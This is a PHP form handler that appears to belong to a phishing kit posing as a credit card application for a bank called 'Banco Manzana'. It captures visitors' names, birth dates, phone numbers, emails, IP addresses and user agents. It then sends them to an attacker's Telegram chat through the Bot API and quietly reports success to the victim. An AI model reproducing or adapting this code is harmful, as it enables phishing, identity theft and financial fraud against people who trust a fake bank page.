<?php
require_once __DIR__ . '/gate_check.php';
ini_set('display_errors', 0);
header('Content-Type: application/json; charset=UTF-8');

require_once __DIR__ . '/data.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

// IP del visitante
$ip = '';
foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$ip   = $ip ?: '?';
$date = date('d/m/Y H:i:s');
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';

// Datos del formulario
$nombres    = trim($_POST['nombres']    ?? '');
$apellidos  = trim($_POST['apellidos']  ?? '');
$fechaNac   = trim($_POST['fechaNac']   ?? '');
$phone      = trim($_POST['phone']      ?? '');
$email      = trim($_POST['email']      ?? '');
$antiguedad = trim($_POST['antiguedad'] ?? '');

// Construir mensaje
$msg  = "🏦 NUEVA SOLICITUD — BANCO MANZANA\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "👤 Nombre: " . ($nombres . ' ' . $apellidos) . "\n";
$msg .= "📅 Fecha Nac: " . $fechaNac . "\n";
$msg .= "📱 Teléfono: " . $phone . "\n";
$msg .= "✉️ Correo: " . $email . "\n";
$msg .= "🕐 Antigüedad: " . $antiguedad . "\n";
$msg .= "🌐 IP: " . $ip . "\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "✅ Solicito tarjeta de crédito Manzana Black Infinite\n";

// Identificador
$uid = $nombres . ' ' . $apellidos;

// Enviar a Telegram (solo informativo, el flujo continúa por sí solo)
file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text'    => $msg,
]));

echo json_encode(['ok' => true, 'uid' => $uid]);
